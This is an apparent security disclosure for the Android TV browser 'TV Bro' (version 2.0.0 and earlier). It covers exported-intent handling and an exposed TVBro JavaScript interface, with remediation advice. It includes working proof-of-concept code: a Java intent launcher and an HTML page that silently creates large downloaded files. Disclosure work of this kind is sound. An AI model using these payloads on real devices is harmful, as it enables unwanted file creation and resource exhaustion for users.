
---

## Vulnerability Report: `com.phlox.tvwebbrowser` 'TV Bro' Version <= 2.0.0

### Vulnerability: JavaScript Code Injection via Intent Handlers

**Severity**: 🔴 High

### Details:

The `com.phlox.tvwebbrowser` application improperly handles external intents, leading to potential Arbitrary Code Execution (ACE) and arbitrary file downloads via crafted URIs.

**Proof of Concept**:

![Proof of Concept](https://github.com/actuator/com.phlox.tvwebbrowser/assets/78701239/581c4577-3ee5-4277-8fe9-2109921a18ec)

```java
Intent intent = new Intent(Intent.ACTION_VIEW);
intent.setComponent(new ComponentName("com.phlox.tvwebbrowser", "com.phlox.tvwebbrowser.activity.main.MainActivity"));
intent.setData(Uri.parse("http://ampulicidae.com")); // any URL
startActivity(intent);
```

**CWE Reference**:
- [CWE-94](https://cwe.mitre.org/data/definitions/94.html): Improper Control of Generation of Code ('Code Injection')

### Remediation Steps:
1. Restrict External Intent Handling: In `AndroidManifest.xml`, set the `exported` attribute for the affected activity to `false`.
2. URI Sanitization: Implement strict validation and sanitation for URIs.

### Addendum:

The `com.phlox.tvwebbrowser` application exposes a JavaScript interface, TVBro, to its WebView component. This poses several security risks:

- **Resource Exhaustion**: Creating extremely large files using `takeBlobDownloadData` method.
- **Arbitrary File Creation/Downloads**: Files with any content can be created and downloaded without user consent.

**Proof of Concept**:

```html
<!-- Simple HTML code to demonstrate vulnerability -->
<!DOCTYPE html>
<html lang="en">
<head>
    <title>TV Bro Exploit Demo</title>
</head>
<body>
    <button onclick="triggerExploit()">Trigger Exploit</button>
    <div id="status"></div>
    <script>
        function generateRandomBase64String(length) {
            let characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/';
            let result = '';
            for (let i = 0; i < length; i++) {
                result += characters.charAt(Math.floor(Math.random() * characters.length));
            }
            return result;
        }
        function triggerExploit() {
            const base64Data = generateRandomBase64String(500000);
            const fileName = 'exploit.txt';
            const url = 'http://ampulicidae.com'; 
            const mimeType = 'text/plain';
            if (window.TVBro && typeof window.TVBro.takeBlobDownloadData === 'function') {
                document.getElementById('status').innerText = "Invoking...";
                window.TVBro.takeBlobDownloadData(base64Data, fileName, url, mimeType);
            } else {
                document.getElementById('status').innerText = "Interface not found.";
            }
        }
    </script>
</body>
</html>
```

--- 

